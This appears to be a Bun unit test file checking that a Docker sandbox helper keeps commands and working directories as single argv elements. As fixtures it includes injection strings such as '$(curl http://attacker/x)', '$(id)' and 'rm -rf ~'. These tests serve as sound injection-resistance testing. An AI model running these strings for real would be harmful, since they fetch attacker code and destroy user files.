import { describe, expect, test } from "bun:test"
import { Sandbox } from "./sandbox"

// buildDockerCommand is pure — no I/O, no Config dependency.
//
// These assert the property the old string-joined wrapper could not hold: the
// command and the working directory each occupy exactly one argv element, so
// nothing in either is re-parsed by a shell. Quoting is no longer something the
// wrapper has to get right, because there is no outer shell to quote for.

describe("Sandbox.buildDockerCommand", () => {
  test("produces a docker run invocation with the image and workspace mount", () => {
    const argv = Sandbox.buildDockerCommand("echo hello", "/home/user/project", "node:20")
    expect(argv.slice(0, 3)).toEqual(["docker", "run", "--rm"])
    expect(argv).toContain("/home/user/project:/workspace:rw")
    expect(argv).toContain("node:20")
    expect(argv.slice(-3)).toEqual(["sh", "-c", "echo hello"])
  })

  test("a working directory containing shell metacharacters stays one argument", () => {
    const cwd = '/path/with"quote and $(id) && rm -rf ~'
    const argv = Sandbox.buildDockerCommand("ls", cwd, "alpine")
    expect(argv).toContain(`${cwd}:/workspace:rw`)
    expect(argv.filter((part) => part.includes(cwd))).toHaveLength(1)
  })

  test("a command containing quotes, operators and substitutions stays one argument", () => {
    const command = `grep -r "pattern" . && echo 'done'; $(curl http://attacker/x) \\" ; id`
    const argv = Sandbox.buildDockerCommand(command, "/workspace", "ubuntu:22.04")
    expect(argv.at(-1)).toBe(command)
    expect(argv).toHaveLength(11)
  })

  test("a multi-step command is passed through verbatim", () => {
    const command = "npm install && npm run build && npm test"
    expect(Sandbox.buildDockerCommand(command, "/app", "node:20-alpine").at(-1)).toBe(command)
  })

  test("a path with spaces needs no quoting and gets none", () => {
    const argv = Sandbox.buildDockerCommand("make", "/Users/dev/my project", "alpine")
    expect(argv).toContain("/Users/dev/my project:/workspace:rw")
  })

  test("uses the exact image string passed - no normalisation", () => {
    const argv = Sandbox.buildDockerCommand("node -e 'console.log(1)'", "/code", "gcr.io/company/runner:sha-abc123")
    expect(argv).toContain("gcr.io/company/runner:sha-abc123")
  })
})
